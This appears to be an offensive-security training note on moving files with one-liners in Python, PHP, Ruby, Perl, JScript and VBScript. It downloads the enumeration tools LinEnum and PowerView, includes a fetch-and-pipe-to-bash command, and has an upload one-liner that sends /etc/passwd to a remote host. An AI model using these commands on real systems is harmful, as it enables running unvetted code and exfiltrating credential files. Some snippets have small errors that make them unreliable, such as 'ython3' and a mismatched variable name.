# Transferring Files with Code

***

### <mark style="color:blue;">Python</mark>

<mark style="color:orange;">**Python 2 - Download**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
python2.7 -c 'import urllib; urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

```
{% endcode %}

<mark style="color:orange;">**Python 3 - Download**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
ython3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
{% endcode %}

***

### <mark style="color:blue;">PHP</mark>

<mark style="color:orange;">**PHP Download with File\_get\_contents()**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
{% endcode %}

<mark style="color:orange;">**PHP Download with Fopen()**</mark>

{% code overflow="wrap" fullWidth="true" %}
```php
<?php
const BUFFER = 1024;

$fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb");
$flocal = fopen("LinEnum.sh", "wb");

while ($buffer = fread($fremote, BUFFER)) {
    fwrite($flocal, $buffer);
}

fclose($flocal);
fclose($fremote);
?>

```
{% endcode %}

***

We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.

<mark style="color:orange;">**PHP Download a File and Pipe it to Bash**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
{% endcode %}

Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.

***

### <mark style="color:blue;">Other Languages</mark>

***

<mark style="color:orange;">**Ruby - Download a File**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
{% endcode %}

***

<mark style="color:orange;">**Perl - Download a File**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
{% endcode %}

***

### <mark style="color:blue;">JavaScript</mark>

C’est du **JScript** (implémentation Microsoft d’ECMAScript) qui s’exécute dans le **Windows Script Host** (WSH) via `cscript.exe` ou `wscript.exe`. Voici l’essentiel en clair.

{% hint style="info" %}
**WSH = Windows Script Host**.\
C’est l’environnement d’exécution natif de Microsoft pour les scripts sur Windows. Il permet d’exécuter des scripts écrits en **JScript** (implémentation MS de JavaScript) ou en **VBScript** directement sur la machine, sans navigateur.
{% endhint %}

{% code fullWidth="true" %}
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
{% endcode %}

We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

<mark style="color:orange;">**Download a File Using JavaScript and cscript.exe**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
{% endcode %}

***

### <mark style="color:blue;">VBScript</mark>

[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.

The following VBScript example can be used based on [this](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs). We'll create a file called `wget.vbs` and save the following content:

```powershell
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.

<mark style="color:orange;">**Download a File Using VBScript and cscript.exe**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
{% endcode %}

***

### <mark style="color:blue;">Upload Operations using Python3</mark>

<mark style="color:orange;">**Starting the Python uploadserver Module**</mark>

```bash
python3 -m uploadserver 
```

<mark style="color:orange;">**Uploading a File Using a Python One-liner**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
{% endcode %}

Let's divide this one-liner into multiple lines to understand each piece better.

```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```
